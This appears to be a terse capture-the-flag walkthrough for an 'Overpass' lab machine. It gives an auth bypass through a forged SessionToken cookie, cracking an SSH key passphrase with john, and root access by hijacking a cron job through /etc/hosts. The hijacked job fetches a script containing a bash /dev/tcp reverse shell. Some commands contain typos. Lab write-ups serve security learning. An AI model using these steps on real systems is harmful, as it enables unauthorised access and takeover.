# overpass 
```
export IP = 10.10.89.3
```
# Reconnaissance
```
- hidden page : http://10.10.89.3/admin/ 

- Vulnerable Point :  http://10.10.89.3/login.js
  : Cookies.set("SessionToken",statusOrCookie)

- CookieSet : (SessionToken, 'Anything')
: curl -v --cookie "SessionToken=anything" http://10.10.89.3/admin/ 

```

# ssh Public Key Crack
```
$ ssh2john.py overpass.rsa > overpass.rsa.hash
$ john overpass.rsa.hash --wordlist={rockyou file Path}
$ james13 

```

# Privilege Excaltation
```
[+] Victim 
$ linpeas.sh
$ cronjob --> curloverpass.thm/dowloads/src/buildscript.sh
$ /etc/hosts -> {export IP} overpass.thm

[+] Attacker
$ mkdir -p /downloads/src/buildscript.sh
$ echo "bash -i >&/dev/tcp/{export IP}/80 0>&1" > buildscipt.sh
$ python3 -m http.server 80 
```